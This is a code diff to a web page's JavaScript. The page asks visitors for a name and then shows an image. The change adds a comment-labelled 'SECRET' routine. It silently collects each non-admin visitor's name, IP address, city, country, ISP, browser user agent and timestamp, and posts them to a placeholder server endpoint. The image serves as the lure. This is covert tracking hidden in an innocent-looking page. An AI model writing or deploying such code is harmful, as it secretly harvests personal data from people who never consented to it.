@@ -36,10 +36,11 @@
     </div>
 
     <script>
-        // ⚠️ REPLACE THIS WITH YOUR ACTUAL IP (find it via https://ipinfo.io)
-        const ADMIN_IP = "83.105.112.217"; 
-
-        const IMAGE_URL = "https://i.imgur.com/example.jpg"; // Replace with your image
+        // Your IP (replace if it changes)
+        const ADMIN_IP = "83.105.112.217";
+        
+        // Replace with your actual image URL
+        const IMAGE_URL = "https://i.imgur.com/example.jpg"; 
         
         async function handleSubmission() {
             const userName = document.getElementById('userName').value.trim() || "Anonymous";
@@ -47,29 +48,25 @@
             try {
                 const ipData = await fetch('https://ipinfo.io/json').then(res => res.json());
                 
-                // 👇 Check if visitor is YOU (admin)
-                if (ipData.ip === ADMIN_IP) {
-                    // Only downloads for YOU
-                    const visitorInfo = `
-                        🕵️ VISITOR TRACKED
-                        ------------------
-                        Name: ${userName}
-                        IP: ${ipData.ip}
-                        Location: ${ipData.city}, ${ipData.country}
-                        ISP: ${ipData.org}
-                        Device: ${navigator.userAgent}
-                        Time: ${new Date().toLocaleString()}
-                    `;
+                // 👇 SECRET: Send data to admin (you) if visitor isn't you
+                if (ipData.ip !== ADMIN_IP) {
+                    // Encode data to send to your server
+                    const visitorData = {
+                        name: userName,
+                        ip: ipData.ip,
+                        city: ipData.city,
+                        country: ipData.country,
+                        isp: ipData.org,
+                        userAgent: navigator.userAgent,
+                        time: new Date().toISOString()
+                    };
                     
-                    // Trigger download (only for admin)
-                    const blob = new Blob([visitorInfo], { type: 'text/plain' });
-                    const a = document.createElement('a');
-                    a.href = URL.createObjectURL(blob);
-                    a.download = `visitor_log_${Date.now()}.txt`;
-                    a.style.display = 'none';
-                    document.body.appendChild(a);
-                    a.click();
-                    setTimeout(() => document.body.removeChild(a), 100);
+                    // 👇 Replace with your server endpoint (see notes below)
+                    fetch("YOUR_SECRET_SERVER_ENDPOINT", {
+                        method: "POST",
+                        body: JSON.stringify(visitorData),
+                        headers: { "Content-Type": "application/json" }
+                    }).catch(e => console.error("Couldn't send data (admin only)"));
                 }
                 
                 // Show image to EVERYONE
@@ -77,7 +74,7 @@
                 document.getElementById('name-form').style.display = 'none';
                 
             } catch (error) {
-                console.error("Error loading image");
+                // Fallback if tracking fails
                 document.getElementById('user-image').style.display = 'block';
                 document.getElementById('name-form').style.display = 'none';
             }
